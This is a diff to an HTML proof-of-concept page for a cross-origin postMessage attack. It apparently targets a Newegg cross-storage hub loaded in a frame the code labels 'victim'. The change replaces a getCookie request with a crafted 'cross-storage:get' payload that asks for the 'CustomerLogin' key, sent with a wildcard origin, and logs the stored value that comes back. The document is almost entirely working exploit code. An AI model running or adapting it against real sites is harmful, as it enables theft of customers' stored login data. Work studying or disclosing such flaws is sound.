@@ -10,11 +10,16 @@
     <iframe src="sandbox.htm" sandbox="allow-scripts" style="display:none;"></iframe>
 
     <script>
+        const payload = JSON.stringify({
+            id: "1234567",
+            action: "cross-storage:get",
+            params: { key: "CustomerLogin" }
+          });
        window.addEventListener("message", (event) => {
         if (event.data === "trigger") {
           // Sandboxed iframe asked us to send message to victim
           const victimFrame = document.getElementById("newegg-frame").contentWindow;
-          victimFrame.postMessage({ action: "getCookie" }, "*");
+          victimFrame.postMessage(payload, "*");
         } else {
           // Handle response from victim
           console.log("Response from storageHub:", event.data);
@@ -23,4 +28,5 @@
     </script>
   </body>
 </html>
+
 
